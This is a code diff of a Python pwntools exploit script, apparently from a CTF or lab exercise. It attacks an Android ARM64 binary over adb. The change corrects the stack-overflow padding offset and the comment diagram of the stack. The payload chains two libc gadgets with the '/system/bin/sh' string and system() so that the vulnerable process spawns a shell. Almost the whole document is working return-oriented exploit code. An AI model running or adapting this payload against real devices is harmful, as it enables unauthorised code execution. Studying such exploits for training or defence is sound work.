@@ -22,8 +22,12 @@ x19         -------
 x20         -------   gg1_sp
             8: gg1
 x30         -------
-            128 + 4 + 8
+            8
+x29         -------
+            128
 buffer      -------
+            48
+vul_sp      -------
 '''
 
 from pwn import *
@@ -39,15 +43,13 @@ gg2 = libc_addr + 0x2b7e0
 sh_addr = libc_addr + libc_elf.search('/system/bin/sh\x00').next()
 system_addr = libc_addr + libc_elf.symbols['system']
 
-payload = 'a' * (128 + 4 + 8)
+payload = 'a' * (128 + 8)
 payload += p64(gg1)
 payload += p64(sh_addr)
 payload += 'a' * 16
 payload += p64(gg2)
 payload += 'a' * (16 + 8)
 payload += p64(system_addr)
-#with open('payload', 'wb') as f:
-#    f.write(payload)
 
 proc = adb.process([bin_path])
 proc.recvuntil('> ')
